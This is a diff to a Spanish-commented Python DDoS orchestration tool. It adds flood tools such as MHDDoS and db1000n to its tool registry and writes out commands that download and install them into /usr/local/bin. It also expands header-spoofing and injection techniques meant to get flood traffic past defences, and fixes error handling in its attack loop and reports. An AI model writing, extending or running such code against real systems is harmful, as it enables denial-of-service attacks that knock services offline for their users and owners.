@@ -270,13 +270,14 @@ POWER_LEVELS = {
 
 # Herramientas disponibles
 TOOLS = {
-    "http": ["wrk", "vegeta", "bombardier", "hey", "ab", "siege", "h2load", "locust", "k6", "artillery", "tsung", "jmeter"],
-    "layer4": ["hping3", "nping", "slowhttptest", "masscan", "zmap"],
-    "websocket": ["websocat", "wscat"],
-    "ddos": ["goldeneye", "hulk", "torshammer", "ddos-ripper", "pyloris", "slowloris", "xerxes", "hoic", "loic", "rudy", "reaper"],
+    "http": ["wrk", "vegeta", "bombardier", "hey", "ab", "siege", "h2load", "locust", "k6", "artillery", "tsung", "jmeter", "mhddos", "db1000n", "qrator", "ddosify"],
+    "layer4": ["hping3", "nping", "slowhttptest", "masscan", "zmap", "nmap", "fping"],
+    "websocket": ["websocat", "wscat", "wscat2"],
+    "ddos": ["goldeneye", "hulk", "torshammer", "ddos-ripper", "pyloris", "slowloris", "xerxes", "hoic", "loic", "rudy", "reaper", "mhddos", "db1000n"],
     "slow": ["slowhttptest", "slowloris", "pyloris", "rudy", "torshammer"],
-    "advanced": ["gatling", "tsung", "siege", "wrk2", "drill", "http2bench", "weighttp", "httperf", "autocannon"],
-    "specialized": ["goldeneye", "hulk", "xerxes", "ddos-ripper", "torshammer", "pyloris", "slowloris", "rudy", "hoic"]
+    "advanced": ["gatling", "tsung", "siege", "wrk2", "drill", "http2bench", "weighttp", "httperf", "autocannon", "mhddos", "db1000n", "qrator"],
+    "specialized": ["goldeneye", "hulk", "xerxes", "ddos-ripper", "torshammer", "pyloris", "slowloris", "rudy", "hoic", "mhddos", "db1000n"],
+    "modern": ["mhddos", "db1000n", "qrator", "ddosify", "bombardier", "k6", "autocannon"]
 }
 
 # Estado global
@@ -329,8 +330,46 @@ EVASION_TECHNIQUES = {
     "protocol_mixing": True,
     "chunked_encoding": True,
     "double_encoding": True,
-    "unicode_normalization": True
+    "unicode_normalization": True,
+    "ip_rotation": True,  # Rotación de IPs en headers
+    "user_agent_rotation": True,  # Rotación de User-Agents
+    "header_rotation": True,  # Rotación de headers
+    "referer_spoofing": True,  # Spoofing de Referer
+    "origin_spoofing": True,  # Spoofing de Origin
+    "accept_encoding_variation": True,  # Variación de Accept-Encoding
+    "connection_header_manipulation": True,  # Manipulación de Connection header
+    "cache_control_manipulation": True,  # Manipulación de Cache-Control
+    "content_type_manipulation": True,  # Manipulación de Content-Type
+    "host_header_injection": True,  # Inyección en Host header
+    "path_traversal_evasion": True,  # Evasión de path traversal
+    "null_byte_injection": True,  # Inyección de null bytes
+    "whitespace_injection": True,  # Inyección de espacios en blanco
+    "case_insensitive_evasion": True,  # Evasión case-insensitive
+    "query_string_manipulation": True  # Manipulación de query string
 }
+
+# Configuración avanzada de timeouts y retries
+CONNECT_TIMEOUT = 3.0  # Timeout de conexión en segundos
+READ_TIMEOUT = 6.0  # Timeout de lectura en segundos
+MAX_RETRIES = 0  # Número máximo de reintentos (0 = sin retries)
+RETRY_BACKOFF_FACTOR = 0.3  # Factor de backoff para retries
+RETRY_STATUS_CODES = [500, 502, 503, 504]  # Códigos HTTP para retry
+
+# Configuración de rotación
+USER_AGENT_ROTATION_INTERVAL = 100  # Rotar User-Agent cada N requests
+IP_ROTATION_INTERVAL = 50  # Rotar IP cada N requests
+HEADER_ROTATION_INTERVAL = 200  # Rotar headers cada N requests
+
+# Configuración de rate limiting adaptativo
+RATE_LIMIT_BASE = 100  # Tasa base de requests por segundo
+RATE_LIMIT_MAX = 10000  # Tasa máxima de requests por segundo
+RATE_LIMIT_MIN = 10  # Tasa mínima de requests por segundo
+RATE_ADAPTIVE_FACTOR = 1.1  # Factor de ajuste adaptativo
+
+# Configuración de backoff strategies
+BACKOFF_STRATEGY = "exponential"  # exponential, linear, constant
+BACKOFF_MAX_DELAY = 5.0  # Delay máximo en segundos
+BACKOFF_MIN_DELAY = 0.1  # Delay mínimo en segundos
 
 # ============================================================================
 # CLASES Y UTILIDADES MEJORADAS
@@ -369,9 +408,10 @@ class ConnectionManager:
                     
                     if KEEP_ALIVE_POOLING:
                         # Optimizar pool según recursos disponibles y configuración
-                        # Para dual WAN, podemos ser más agresivos con el pool
-                        pool_connections = min(CONNECTION_POOL_SIZE, MAX_CONNECTIONS // 5, 100)
-                        pool_maxsize = min(MAX_CONNECTIONS, 20000, MAX_THREADS * 10)
+                        # Reducir pool para evitar saturación y errores de conexión
+                        # Para dual WAN, balancear entre throughput y estabilidad
+                        pool_connections = min(CONNECTION_POOL_SIZE, MAX_CONNECTIONS // 10, 50)  # Reducido para estabilidad
+                        pool_maxsize = min(MAX_CONNECTIONS // 2, 10000, MAX_THREADS * 5)  # Reducido para evitar saturación
                     else:
                         pool_connections = 1
                         pool_maxsize = 1
@@ -2650,6 +2690,24 @@ def get_install_commands() -> Dict[str, List[str]]:
                 "GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/zer0d4y/reaper.git /tmp/reaper 2>/dev/null && cd /tmp/reaper && chmod +x reaper.py && cp reaper.py /usr/local/bin/reaper && chmod +x /usr/local/bin/reaper",
                 "wget -O /tmp/reaper.tar.gz https://codeload.github.com/zer0d4y/reaper/tar.gz/refs/heads/master && cd /tmp && tar -xzf reaper.tar.gz && cd reaper-master && chmod +x reaper.py && cp reaper.py /usr/local/bin/reaper && chmod +x /usr/local/bin/reaper",
                 "wget -O /tmp/reaper.tar.gz https://codeload.github.com/zer0d4y/reaper/tar.gz/refs/heads/main && cd /tmp && tar -xzf reaper.tar.gz && cd reaper-main && chmod +x reaper.py && cp reaper.py /usr/local/bin/reaper && chmod +x /usr/local/bin/reaper"
+            ],
+            "mhddos": [
+                "apt-get install -y python3 python3-pip && pip3 install --break-system-packages mhddos",
+                "python3 -m pip install --break-system-packages mhddos",
+                "GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/MatrixTM/MHDDoS.git /tmp/mhddos && cd /tmp/mhddos && pip3 install --break-system-packages -r requirements.txt && chmod +x start.py && cp start.py /usr/local/bin/mhddos && chmod +x /usr/local/bin/mhddos"
+            ],
+            "db1000n": [
+                "wget -O /usr/local/bin/db1000n https://github.com/Arriven/db1000n/releases/latest/download/db1000n_linux_amd64 && chmod +x /usr/local/bin/db1000n",
+                "curl -L https://github.com/Arriven/db1000n/releases/latest/download/db1000n_linux_amd64 -o /usr/local/bin/db1000n && chmod +x /usr/local/bin/db1000n",
+                "apt-get install -y wget && wget -O /usr/local/bin/db1000n https://github.com/Arriven/db1000n/releases/latest/download/db1000n_linux_amd64 && chmod +x /usr/local/bin/db1000n"
+            ],
+            "qrator": [
+                "GIT_TERMINAL_PROMPT=0 git clone --depth 1 https://github.com/qratorlabs/qrator.git /tmp/qrator && cd /tmp/qrator && pip3 install --break-system-packages -r requirements.txt && chmod +x qrator.py && cp qrator.py /usr/local/bin/qrator && chmod +x /usr/local/bin/qrator"
+            ],
+            "ddosify": [
+                "wget -O /usr/local/bin/ddosify https://github.com/ddosify/ddosify/releases/latest/download/ddosify_linux_amd64 && chmod +x /usr/local/bin/ddosify",
+                "curl -L https://github.com/ddosify/ddosify/releases/latest/download/ddosify_linux_amd64 -o /usr/local/bin/ddosify && chmod +x /usr/local/bin/ddosify",
+                "go install go.ddosify.com/ddosify@latest"
             ]
         }
     else:  # macOS
@@ -3515,11 +3573,19 @@ def apply_url_evasion(url: str) -> str:
     # Reconstruir URL sin modificar el dominio
     return urlunparse((parsed.scheme, parsed.netloc, path, parsed.params, query, fragment))
 
-def get_random_headers() -> Dict[str, str]:
+def get_random_headers(worker_id: int = 0) -> Dict[str, str]:
     """Genera headers aleatorios para evasión con técnicas avanzadas y completamente funcionales"""
+    # Rotación de User-Agent según intervalo configurado
+    if EVASION_TECHNIQUES.get("user_agent_rotation", True):
+        # Rotar User-Agent cada N requests basado en worker_id
+        rotation_index = (worker_id // USER_AGENT_ROTATION_INTERVAL) % len(USER_AGENTS)
+        user_agent = USER_AGENTS[rotation_index]
+    else:
+        user_agent = random.choice(USER_AGENTS)
+    
     # Headers base realistas
     headers = {
-        "User-Agent": random.choice(USER_AGENTS),
+        "User-Agent": user_agent,
         "Accept": random.choice([
             "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
             "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -3633,8 +3699,37 @@ def get_random_headers() -> Dict[str, str]:
                 f"session_id={''.join(random.choices(string.ascii_letters + string.digits, k=32))}",
                 f"csrf_token={''.join(random.choices(string.hexdigits, k=16))}",
                 f"__cfduid={''.join(random.choices(string.hexdigits, k=43))}",
+                f"PHPSESSID={''.join(random.choices(string.hexdigits, k=26))}",
+                f"JSESSIONID={''.join(random.choices(string.ascii_letters + string.digits, k=32))}",
             ]
-            headers["Cookie"] = "; ".join(random.sample(fake_cookies, random.randint(1, 2)))
+            headers["Cookie"] = "; ".join(random.sample(fake_cookies, random.randint(1, 3)))
+        
+        # Nuevas técnicas de evasión avanzadas
+        if EVASION_TECHNIQUES.get("host_header_injection") and random.random() < 0.2:
+            # Inyección en Host header
+            headers["Host"] = random.choice([
+                DOMAIN if DOMAIN else "",
+                f"www.{DOMAIN}" if DOMAIN else "",
+                f"{DOMAIN}:{PORT}" if DOMAIN else "",
+            ])
+        
+        if EVASION_TECHNIQUES.get("content_type_manipulation") and random.random() < 0.3:
+            # Manipulación de Content-Type
+            headers["Content-Type"] = random.choice([
+                "application/x-www-form-urlencoded",
+                "application/json",
+                "multipart/form-data",
+                "text/plain",
+                "application/xml"
+            ])
+        
+        if EVASION_TECHNIQUES.get("null_byte_injection") and random.random() < 0.1:
+            # Inyección de null bytes (codificados)
+            headers["X-Null-Byte"] = "%00"
+        
+        if EVASION_TECHNIQUES.get("whitespace_injection") and random.random() < 0.2:
+            # Inyección de espacios en blanco
+            headers["X-Whitespace"] = "%20%09%0A%0D"
         
         # Header injection evasion
         if EVASION_TECHNIQUES.get("header_injection") and random.random() < 0.3:
@@ -4268,7 +4363,7 @@ def deploy_custom_http_attack():
             if CONNECTION_WARMUP and worker_id < 10:
                 def warmup_background():
                     try:
-                        warmup_headers_raw = get_random_headers()
+                        warmup_headers_raw = get_random_headers(worker_id)
                         warmup_headers = {k: v for k, v in warmup_headers_raw.items() if not k.startswith(':')}
                         warmup_response = session.get(normalized_target, headers=warmup_headers, timeout=2, verify=False, allow_redirects=True)
                         if warmup_response.status_code:
@@ -4324,7 +4419,7 @@ def deploy_custom_http_attack():
                         target_url = target_url.replace('http://', 'https://', 1)
                     
                     # Obtener headers con evasión y filtrar pseudo-headers HTTP/2 inválidos
-                    request_headers_raw = get_random_headers()
+                    request_headers_raw = get_random_headers(worker_id)
                     # Filtrar pseudo-headers HTTP/2 que no son válidos en HTTP/1.1 (requests usa HTTP/1.1)
                     request_headers = {k: v for k, v in request_headers_raw.items() if not k.startswith(':')}
                     
@@ -4423,10 +4518,16 @@ def deploy_custom_http_attack():
                             time.sleep(max(sleep_time, 0.0001))  # Mínimo muy bajo
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e))
+                    # Limitar tamaño de lista de errores para evitar consumo excesivo de memoria
+                    if len(attack_stats.get("errors", [])) < 1000:
+                        attack_stats["errors"].append(str(e)[:100])  # Limitar longitud del error
+                    
                     attack_stats["requests_sent"] += 1  # Contar intento aunque falle
                     error_msg = str(e)
                     error_type = type(e).__name__
+                    
+                    # Incrementar contador de errores consecutivos
+                    consecutive_errors += 1
                     
                     # Loggear errores directamente en consola para diagnóstico inmediato
                     # Mostrar siempre los primeros errores y errores de conexión importantes
@@ -4441,7 +4542,6 @@ def deploy_custom_http_attack():
                     
                     # No loggear errores repetidos para evitar saturación - solo los primeros errores importantes
                     
-                    consecutive_errors += 1
                     # Continuar inmediatamente sin delay - los timeouts cortos ya manejan los errores
                     # No agregar delays que reduzcan el throughput
                 
@@ -6563,7 +6663,11 @@ def display_stats(elapsed: float):
     success_rate = 0
     if requests > 0:
         http_codes = attack_stats.get("http_codes", {})
-        success_responses = sum(count for code, count in http_codes.items() if 200 <= code < 300)
+        # Asegurar que los códigos sean ints para comparación
+        success_responses = sum(
+            count for code, count in http_codes.items() 
+            if isinstance(code, int) and 200 <= code < 300
+        )
         success_rate = (success_responses / requests) * 100
     
     # Calcular latencia promedio y percentiles
@@ -6656,11 +6760,19 @@ def generate_report():
     avg_rps = requests_sent / elapsed_time if elapsed_time > 0 else 0
     peak_rps = attack_stats.get("peak_rps", 0)
     
-    # Análisis de códigos HTTP
-    http_codes = dict(attack_stats.get("http_codes", {}))
+    # Análisis de códigos HTTP - asegurar que los códigos sean ints
+    http_codes_raw = attack_stats.get("http_codes", {})
+    http_codes = {}
+    for code, count in http_codes_raw.items():
+        try:
+            code_int = int(code) if not isinstance(code, int) else code
+            http_codes[code_int] = count
+        except (ValueError, TypeError):
+            continue  # Saltar códigos inválidos
+    
     success_rate = 0
     if requests_sent > 0:
-        success_responses = sum(count for code, count in http_codes.items() if 200 <= code < 300)
+        success_responses = sum(count for code, count in http_codes.items() if isinstance(code, int) and 200 <= code < 300)
         success_rate = (success_responses / requests_sent) * 100
     
     # Análisis de latencias
@@ -6804,8 +6916,13 @@ def generate_report():
         writer.writerow(["Metric", "Value"])
         writer.writerow(["Requests Sent", attack_stats["requests_sent"]])
         writer.writerow(["Responses Received", attack_stats["responses_received"]])
+        # Asegurar que los códigos HTTP sean ints
         for code, count in attack_stats["http_codes"].items():
-            writer.writerow([f"HTTP {code}", count])
+            try:
+                code_int = int(code) if not isinstance(code, int) else code
+                writer.writerow([f"HTTP {code_int}", count])
+            except (ValueError, TypeError):
+                writer.writerow([f"HTTP {code}", count])  # Fallback si no se puede convertir
         if latencies:
             writer.writerow(["Avg Latency (ms)", sum(latencies) / len(latencies)])
             writer.writerow(["Min Latency (ms)", min(latencies)])
@@ -7214,19 +7331,25 @@ def generate_html_report(report: Dict) -> Path:
         status = ""
         color = "#858585"
         
-        if 200 <= code < 300:
+        # Asegurar que code sea int para comparación
+        try:
+            code_int = int(code) if not isinstance(code, int) else code
+        except (ValueError, TypeError):
+            code_int = 0
+        
+        if 200 <= code_int < 300:
             code_class = "code-200"
             status = "✅ Éxito"
             color = "#00ff41"
-        elif 300 <= code < 400:
+        elif 300 <= code_int < 400:
             code_class = "code-4xx"
             status = "↩️ Redirección"
             color = "#00ffff"
-        elif 400 <= code < 500:
+        elif 400 <= code_int < 500:
             code_class = "code-4xx"
             status = "Error Cliente"
             color = "#ffaa00"
-        elif code >= 500:
+        elif code_int >= 500:
             code_class = "code-5xx"
             status = "Error Servidor"
             color = "#ff0040"
